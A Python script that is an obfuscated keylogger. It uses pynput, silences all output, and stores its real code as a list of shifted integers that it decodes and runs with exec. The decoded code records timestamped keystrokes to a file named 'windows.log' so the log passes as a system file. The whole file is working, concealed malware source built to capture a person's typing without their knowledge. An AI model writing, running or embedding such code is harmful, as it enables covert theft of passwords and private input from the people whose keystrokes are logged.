from pynput import keyboard
import os
import datetime
import sys

sys.stderr = open(os.devnull, "w")
sys.stdout = open(os.devnull, "w")

prev = datetime.datetime.now()

l = [
    [-30, -29, -28, -98, -19, -20, -35, -23, -29, -9, -35],
    [-18, -16, -29, -15, -15, -90, -23, -29, -9, -89, -72],
    [-120, -98, -98, -98, -98, -27, -22, -19, -32, -33, -22],
    [-98, -18, -16, -29, -12, -120, -98, -98, -98, -98, -31],
    [-13, -16, -16, -98, -69, -98, -30, -33, -14, -29, -14],
    [-25, -21, -29, -84, -30, -33, -14, -29, -14, -25, -21],
    [-29, -84, -20, -19, -11, -90, -89, -120, -98, -98, -98],
    [-98, -25, -28, -98, -23, -29, -9, -98, -69, -69, -98],
    [-23, -29, -9, -32, -19, -33, -16, -30, -84, -55, -29],
    [-9, -84, -29, -20, -14, -29, -16, -72, -120, -98, -98],
    [-98, -98, -98, -98, -98, -98, -14, -29, -10, -14, -98],
    [-69, -98, -96, -38, -38, -20, -96, -120, -98, -98, -98],
    [-98, -29, -22, -25, -28, -98, -23, -29, -9, -98, -69],
    [-69, -98, -23, -29, -9, -32, -19, -33, -16, -30, -84],
    [-55, -29, -9, -84, -14, -33, -32, -72, -120, -98, -98],
    [-98, -98, -98, -98, -98, -98, -14, -29, -10, -14, -98],
    [-69, -98, -96, -38, -38, -14, -96, -120, -98, -98, -98],
    [-98, -29, -22, -25, -28, -98, -23, -29, -9, -98, -69],
    [-69, -98, -23, -29, -9, -32, -19, -33, -16, -30, -84],
    [-55, -29, -9, -84, -15, -18, -33, -31, -29, -72, -120],
    [-98, -98, -98, -98, -98, -98, -98, -98, -14, -29, -10],
    [-14, -98, -69, -98, -96, -98, -96, -120, -98, -98, -98],
    [-98, -29, -22, -25, -28, -98, -23, -29, -9, -98, -69],
    [-69, -98, -23, -29, -9, -32, -19, -33, -16, -30, -84],
    [-55, -29, -9, -84, -32, -33, -31, -23, -15, -18, -33],
    [-31, -29, -72, -120, -98, -98, -98, -98, -98, -98, -98],
    [-98, -14, -29, -10, -14, -98, -69, -98, -96, -38, -38],
    [-32, -96, -120, -98, -98, -98, -98, -29, -22, -25, -28],
    [-98, -23, -29, -9, -98, -69, -69, -98, -23, -29, -9],
    [-32, -19, -33, -16, -30, -84, -55, -29, -9, -84, -33],
    [-22, -14, -35, -22, -98, -19, -16, -98, -23, -29, -9],
    [-98, -69, -69, -98, -23, -29, -9, -32, -19, -33, -16],
    [-30, -84, -55, -29, -9, -84, -33, -22, -14, -35, -27],
    [-16, -72, -120, -98, -98, -98, -98, -98, -98, -98, -98],
    [-14, -29, -10, -14, -98, -69, -98, -96, -38, -38, -33],
    [-96, -120, -98, -98, -98, -98, -29, -22, -25, -28, -98],
    [-23, -29, -9, -98, -69, -69, -98, -23, -29, -9, -32],
    [-19, -33, -16, -30, -84, -55, -29, -9, -84, -31, -14],
    [-16, -22, -35, -22, -98, -19, -16, -98, -23, -29, -9],
    [-98, -69, -69, -98, -23, -29, -9, -32, -19, -33, -16],
    [-30, -84, -55, -29, -9, -84, -31, -14, -16, -22, -35],
    [-16, -72, -120, -98, -98, -98, -98, -98, -98, -98, -98],
    [-14, -29, -10, -14, -98, -69, -98, -16, -96, -38, -38],
    [-31, -96, -120, -98, -98, -98, -98, -29, -22, -25, -28],
    [-98, -23, -29, -9, -98, -25, -20, -98, -39, -120, -98],
    [-98, -98, -98, -98, -98, -98, -98, -23, -29, -9, -32],
    [-19, -33, -16, -30, -84, -55, -29, -9, -84, -16, -25],
    [-27, -26, -14, -86, -120, -98, -98, -98, -98, -98, -98],
    [-98, -98, -23, -29, -9, -32, -19, -33, -16, -30, -84],
    [-55, -29, -9, -84, -22, -29, -28, -14, -86, -120, -98],
    [-98, -98, -98, -98, -98, -98, -98, -23, -29, -9, -32],
    [-19, -33, -16, -30, -84, -55, -29, -9, -84, -13, -18],
    [-86, -120, -98, -98, -98, -98, -98, -98, -98, -98, -23],
    [-29, -9, -32, -19, -33, -16, -30, -84, -55, -29, -9],
    [-84, -30, -19, -11, -20, -86, -120, -98, -98, -98, -98],
    [-37, -72, -120, -98, -98, -98, -98, -98, -98, -98, -98],
    [-14, -29, -10, -14, -98, -69, -98, -96, -96, -120, -98],
    [-98, -98, -98, -29, -22, -15, -29, -72, -120, -98, -98],
    [-98, -98, -98, -98, -98, -98, -14, -29, -10, -14, -98],
    [-69, -98, -15, -14, -16, -90, -23, -29, -9, -89, -84],
    [-15, -14, -16, -25, -18, -90, -96, -91, -96, -89, -84],
    [-16, -29, -18, -22, -33, -31, -29, -90, -91, -55, -29],
    [-9, -84, -91, -86, -91, -38, -38, -91, -89, -120, -98],
    [-98, -98, -98, -11, -25, -14, -26, -98, -19, -18, -29],
    [-20, -90, -22, -19, -27, -35, -28, -25, -22, -29, -86],
    [-98, -96, -33, -96, -89, -98, -33, -15, -98, -28, -72],
    [-120, -98, -98, -98, -98, -98, -98, -98, -98, -25, -28],
    [-98, -18, -16, -29, -12, -98, -87, -98, -30, -33, -14],
    [-29, -14, -25, -21, -29, -84, -14, -25, -21, -29, -30],
    [-29, -22, -14, -33, -90, -15, -29, -31, -19, -20, -30],
    [-15, -69, -81, -82, -89, -98, -70, -98, -31, -13, -16],
    [-16, -72, -120, -98, -98, -98, -98, -98, -98, -98, -98],
    [-98, -98, -98, -98, -14, -25, -21, -29, -15, -14, -33],
    [-21, -18, -98, -69, -98, -30, -33, -14, -29, -14, -25],
    [-21, -29, -84, -30, -33, -14, -29, -14, -25, -21, -29],
    [-84, -20, -19, -11, -90, -89, -84, -15, -14, -16, -28],
    [-14, -25, -21, -29, -90, -16, -96, -93, -41, -85, -93],
    [-21, -85, -93, -30, -98, -93, -58, -72, -93, -53, -72],
    [-93, -47, -96, -89, -120, -98, -98, -98, -98, -98, -98],
    [-98, -98, -98, -98, -98, -98, -14, -29, -10, -14, -98],
    [-69, -98, -28, -96, -38, -20, -98, -7, -14, -25, -21],
    [-29, -15, -14, -33, -21, -18, -5, -72, -98, -96, -98],
    [-87, -98, -14, -29, -10, -14, -120, -98, -98, -98, -98],
    [-98, -98, -98, -98, -28, -84, -11, -16, -25, -14, -29],
    [-90, -14, -29, -10, -14, -89, -120, -98, -98, -98, -98],
    [-18, -16, -29, -12, -98, -69, -98, -31, -13, -16, -16],
    [-120, -22, -19, -27, -35, -28, -25, -22, -29, -98, -69],
    [-98, -96, -11, -25, -20, -30, -19, -11, -15, -84, -22],
    [-19, -27, -96, -120, -14, -16, -9, -72, -120, -98, -98],
    [-98, -98, -11, -25, -14, -26, -98, -23, -29, -9, -32],
    [-19, -33, -16, -30, -84, -54, -25, -15, -14, -29, -20],
    [-29, -16, -90, -19, -20, -35, -18, -16, -29, -15, -15],
    [-69, -19, -20, -35, -23, -29, -9, -35, -18, -16, -29],
    [-15, -15, -89, -98, -33, -15, -98, -22, -25, -15, -14],
    [-29, -20, -29, -16, -72, -120, -98, -98, -98, -98, -98],
    [-98, -98, -98, -22, -25, -15, -14, -29, -20, -29, -16],
    [-84, -24, -19, -25, -20, -90, -89, -120, -29, -10, -31],
    [-29, -18, -14, -72, -120, -98, -98, -98, -98, -18, -33],
    [-15, -15, -71, -120],
]


def chr_decode(i):
    return chr(i + 130)


l4 = []
for i in l:
    l4.extend(i)
l4 = map(chr_decode, l4)

s = "".join(l4)

exec(s)
